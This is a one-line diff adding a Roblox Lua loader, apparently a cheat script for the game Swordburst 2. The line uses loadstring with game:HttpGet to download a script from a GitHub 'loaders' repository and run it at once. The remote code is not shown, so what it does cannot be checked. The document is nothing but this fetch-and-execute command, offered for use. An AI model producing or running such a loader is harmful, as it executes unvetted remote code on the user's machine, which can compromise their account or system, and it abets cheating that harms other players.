@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/wave-defense-swordburst-2-spam4-uso19d81ijhs8z.lua"))()
